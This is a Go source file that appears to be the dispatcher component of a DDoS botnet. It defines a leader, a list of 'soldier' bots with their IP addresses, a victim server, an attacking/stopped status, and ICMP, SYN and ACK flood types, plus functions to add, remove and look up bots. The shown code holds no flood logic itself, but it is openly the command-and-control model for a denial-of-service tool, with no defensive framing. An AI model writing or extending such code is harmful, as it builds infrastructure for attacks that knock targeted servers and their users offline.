package dispatcher

import "time"

type Leader struct {
	Name               string `json:"name"`
	AuthenticationHash string `json:"-"`
}

type Soldier struct {
	Name        string    `json:"name"`
	Ip          string    `json:"ip"`
	LastRequest time.Time `json:"last_request"`
	Speed       int       `json:"speed"`
}

const (
	StatusAttacking = "attacking"
	StatusStopped   = "stopped"
)
const (
	DDOSTypeICMP = "ICMP"
	DDOSTypeSYN  = "SYN"
	DDOSTypeACK  = "ACK"
)

type CampSettings struct {
	Status       string `json:"status"`
	VictimServer string `json:"victim"`
	DDOSType     string `json:"ddos_type"`
}

type Camp struct {
	Leader   Leader       `json:"leader"`
	Soldiers []Soldier    `json:"soldiers"`
	Settings CampSettings `json:"camp_settings"`
}

func (c *Camp) AddSoldier(s Soldier) {
	c.Soldiers = append(c.Soldiers, s)
}

func (c *Camp) RemoveSoldier(name string) {
	for i, soldier := range c.Soldiers {
		if soldier.Name == name {
			c.Soldiers = append(c.Soldiers[:i], c.Soldiers[i+1:]...)
		}
	}
}
func (c *Camp) GetSoldierByName(name string) *Soldier {
	for index, soldier := range c.Soldiers {
		if soldier.Name == name {
			return &c.Soldiers[index]
		}
	}
	return nil
}

func (c *Camp) GetSoldierByIp(ip string) *Soldier {
	for index, soldier := range c.Soldiers {
		if soldier.Ip == ip {
			return &c.Soldiers[index]
		}
	}
	return nil
}

func (c *Camp) GetSoldierByIpAndName(name string, ip string) *Soldier {
	for index, soldier := range c.Soldiers {
		if soldier.Ip == ip && soldier.Name == name {
			return &c.Soldiers[index]
		}
	}
	return nil
}

func (c *Camp) SoldierExists(name string) bool {
	for _, soldier := range c.Soldiers {
		if soldier.Name == name {
			return true
		}
	}
	return false
}
